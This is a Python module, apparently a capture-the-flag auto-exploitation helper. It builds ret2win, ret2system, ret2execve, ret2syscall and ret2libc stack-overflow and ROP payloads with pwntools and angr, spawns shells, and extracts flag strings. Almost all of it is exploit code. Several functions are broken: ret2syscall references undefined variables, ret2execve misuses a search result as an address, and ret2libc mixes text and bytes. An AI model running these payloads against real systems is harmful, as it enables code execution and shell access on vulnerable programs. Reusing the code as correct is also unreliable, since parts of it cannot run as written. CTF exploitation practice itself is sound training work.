from typing import Optional
from time import sleep
import re
from pwn import *
import angr, angrop


def ret2win(vuln) -> Optional[str]:
    bin_path = vuln.bin_path
    start_pay = vuln.payload_start
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]{32}\})"""

    elf = ELF(bin_path)
    win_addr = p64(elf.symbols['win'])
    p = process(bin_path)
    p.sendline(start_pay + win_addr)
    sleep(2)
    try:
        p.sendline(b"cat flag.txt")
    except EOFError:
        pass
    out = ""
    while 'flag' not in out:
        try:
            out += p.recvS()
        except EOFError:
            break
    
    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)


def ret2system(vuln) -> Optional[str]:
    bin_path = vuln.bin_path
    start_pay = vuln.payload_start
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]{32}\})"""

    elf = ELF(bin_path)
    try:
        vuln_str = p64(next(elf.search(b"/bin/cat flag.txt")))
    except StopIteration:
        try:
            vuln_str = p64(next(elf.search(b"/bin/sh")))
        except StopIteration:
            return None
    system_addr = p64(elf.symbols['system'])
    r = ROP(elf)
    pop_rdi = p64(r.find_gadget((['pop rdi', 'ret']))[0])

    p = process(bin_path)
    p.sendline(start_pay + pop_rdi + vuln_str + system_addr)
    print(start_pay + pop_rdi + vuln_str + system_addr)
    p.interactive()
    p.sendline(b"cat flag.txt")
    out = p.recvS()

    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)


def ret2execve(vuln) -> Optional[str]:
    bin_path = vuln.bin_path
    start_pay = vuln.payload_start
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]{32}\})"""

    elf = ELF(bin_path)
    try:
        vuln_str = elf.search("cat flag.txt")
    except StopIteration:
        try:
            vuln_str = elf.search("/bin/sh")
        except StopIteration:
            return None
    system_addr = p64(elf.symbols['execve'])

    r = ROP(elf)
    pop_rdi = p64(r.find_gadget(['pop rdi', 'ret'])[0])
    pop_rsi = p64(r.find_gadget(['pop rsi', 'ret'])[0])
    pop_rcx = p64(r.find_gadget(['pop rdx', 'ret'])[0])

    p = process(bin_path)
    p.sendline(start_pay + pop_rdi + vuln_str + pop_rsi + p64(0) + pop_rcx + p64(0) + system_addr)
    p.sendline(b"cat flag.txt")
    p.recv()
    out = p.recvS()

    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)


def ret2syscall(vuln) -> Optional[str]:
    bin_sh = next(e.search(b'/bin/sh'))
    #syscall = p64(e.sym['syscall'])
    print("Using Angrop")
    proj = angr.Project(binary)
    arop = proj.analyses.ROP()
    arop.find_gadgets_single_threaded()
    chain = arop.set_regs(rax=59, rdi=bin_sh, rsi=0, rdx=0)
    exp = padding + chain.payload_str()
    exp += p64(r.find_gadget(['syscall'])[0])
    p.recvuntil(b' >>>')
    p.sendline(exp)
    #sleep(1)
    p.sendline(b'cat flag.txt')
    p.interactive()


def ret2libc(vuln, rip, rsp, binary) -> Optional[str]:
    e = ELF(binary)
    p = process(binary)
    r = ROP(binary)
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
    functions = p.libc.functions
    libc_exit = functions['exit']
    libc_system = functions['system']
    bin_sh = next(p.libc.search(b'/bin/sh'))
    
    endian = None
    if e.endian == 'little':
        endian = "<I"
    elif e.endian == 'big':
        endian = ">I"
    else:
        print("What endian is this? " + e.endian)

    payload = ""
    payload += 'A' * rip
    payload += struct.pack(endian, libc_system)
    payload += struct.pack(endian, libc_exit)
    payload += struct.pack(endian, bin_sh)
    p.sendline(payload.encode())


def ropwrite(vuln) -> Optional[str]:
    return None # TODO
